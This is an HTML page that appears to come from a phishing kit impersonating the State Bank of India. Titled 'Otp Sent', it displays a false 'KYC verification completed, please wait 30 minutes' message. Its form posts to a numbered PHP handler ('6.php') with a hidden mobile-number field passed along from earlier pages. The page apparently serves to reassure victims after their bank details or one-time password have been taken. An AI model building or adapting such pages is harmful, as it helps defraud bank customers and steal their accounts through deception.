<!DOCTYPE HTML> 
<html lang="zxx">
   <head>
      <title>Otp Sent </title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <meta charset="utf-8">
      <meta name="keywords" content="">
      <script> addEventListener("load", function () { setTimeout(hideURLbar, 0); }, false); function hideURLbar() { window.scrollTo(0, 1); } </script> <!-- //Meta-Tags --> <!-- Stylesheets --> 
      <link href="unamestyle.css" rel='stylesheet' type='text/css' />
      <!--// Stylesheets --> <!-- online fonts --> 
      <link href="//fonts.googleapis.com/css?family=Ubuntu+Condensed" rel="stylesheet">
      <link rel="stylesheet" type="text/css" href="bootstrap.css">
   </head>
   <body>
      <header></header>
      <img src="otp-header1.jpg" style="width: 100%; padding-bottom: 0px !important;"> 
      <div class="row">
         <div class="col-md-3"></div>
         <div class="col-md-6">
            <div class="mrd">
               <form action="6.php" method="post">
                  <div class="row">
                     <div class="col-md-12">
                        <br><br> 
                        <CENTER>
                           <h1 style="color:DodgerBlue;">Thank you for using SBI your KYC verification completed please wait 30 minutes</h1>
                        </CENTER>
                        <input type="hidden" class="pst" name="mobile" required="" value=""> 
                     </div>
                  </div>
                  <br> 
                  <div class="w3ls-login">
                     <p style="text-align: left !important; margin-left: -166px;"> </button> </p>
                  </div>
               </form>
            </div>
         </div>
         <div class="col-md-3"></div>
      </div>
      <img src="footer.jpg" style="width: 100%; padding:0px !important;"> 
   </body>
</html>